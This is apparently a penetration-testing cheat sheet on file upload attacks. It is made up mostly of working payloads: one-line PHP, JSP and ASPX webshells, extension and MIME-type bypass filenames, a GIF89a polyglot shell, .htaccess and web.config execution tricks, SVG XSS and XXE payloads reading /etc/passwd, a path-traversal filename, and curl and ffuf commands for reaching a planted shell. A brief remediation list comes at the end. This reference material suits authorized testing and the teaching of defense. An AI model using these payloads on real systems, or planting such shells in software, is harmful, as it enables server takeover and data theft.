---
tags:
  - Web
---

# :material-file-upload: File Upload Attacks

<span class="pill pill-hard">→ RCE</span> <span class="pill pill-info">web</span>

An upload feature that stores attacker-controlled files in a web-accessible, script-executing location is a straight line to **remote code execution**.

!!! abstract "TL;DR"
    Upload a webshell, defeat whatever validation exists (extension, content-type, magic bytes), find where it lands, and browse to it. If you can't get code exec, fall back to XSS/SVG/XXE via the upload.

## :material-bug: The classic webshell

=== "PHP"

    ```php
    <?php system($_GET['c']); ?>
    ```
    Then: `curl 'http://target/uploads/shell.php?c=id'`

=== "PHP (stealthier)"

    ```php
    <?=`$_GET[0]`?>
    ```

=== "JSP"

    ```jsp
    <% Runtime.getRuntime().exec(request.getParameter("c")); %>
    ```

=== "ASPX"

    ```csharp
    <%@ Page Language="C#"%><% System.Diagnostics.Process.Start("cmd","/c "+Request["c"]); %>
    ```

!!! tip "Know the backend first"
    Uploading a `.php` shell to an IIS/.NET app does nothing. Fingerprint the stack ([Web recon](index.md)) so you pick an executable extension the server will actually run.

## :material-shield-off: Bypassing validation

=== "Extension filters"

    ```text
    shell.php  -> shell.pHp  shell.php5  shell.phtml  shell.phar
    shell.php.jpg            (double extension, permissive parsers)
    shell.jpg.php            (last extension wins on many servers)
    shell.php%00.jpg         (null byte — old PHP/CGI)
    shell.php.               (trailing dot/space on Windows)
    shell.php:.jpg           (NTFS ADS)
    ```

=== "Content-Type"

    Just change the header in Burp:
    ```http
    Content-Type: image/png     <- lie about the MIME type
    ```

=== "Magic bytes"

    Prepend real file signature bytes, keep the code after:
    ```text
    GIF89a;
    <?php system($_GET['c']); ?>
    ```
    `GIF89a` makes `getimagesize()` and naive sniffers accept it as an image.

=== ".htaccess / web.config trick"

    Can't upload `.php`? Upload a config that makes a benign extension executable:
    ```apache
    # .htaccess (Apache)
    AddType application/x-httpd-php .jpg
    ```
    ```xml
    <!-- web.config (IIS) -->
    <configuration><system.webServer><handlers>
      <add name="x" path="*.config" verb="*" type="System.Web.UI.PageHandlerFactory"/>
    </handlers></system.webServer></configuration>
    ```

## :material-image-broken: When RCE isn't possible

The upload can still be dangerous:

- **SVG → XSS/XXE**: SVGs are XML and render in-browser.
  ```xml
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
  ```
  ```xml
  <?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <svg><text>&xxe;</text></svg>
  ```
- **Path traversal in filename** → overwrite files:
  ```text
  filename="../../../../var/www/html/index.php"
  ```
- **Image parser exploits** (ImageMagick "ImageTragick", ExifTool RCE via crafted metadata).
- **Pixel flood / zip bomb** for DoS findings.

!!! loot "Find where it landed"
    Fuzz for the upload directory if it's not obvious:
    ```bash
    ffuf -u http://target/FUZZ/shell.php -w dirs.txt
    ```
    Common: `/uploads/`, `/files/`, `/images/`, `/media/`, or an S3 bucket URL in the response.

## :material-shield-check: Remediation

- Validate by **content**, not extension; re-encode images server-side.
- Store uploads **outside the web root** or on a domain with no execution.
- Randomize stored filenames; strip path components.
- Serve with `Content-Disposition: attachment` and a restrictive `Content-Type`.

## :material-link-variant: Related

- The payoff is a shell → head to [Linux](../privesc/linux.md) / [Windows Privesc](../privesc/windows.md).
- SVG/XXE overlaps with [SSRF](ssrf.md).
- Reference: [OWASP File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload).
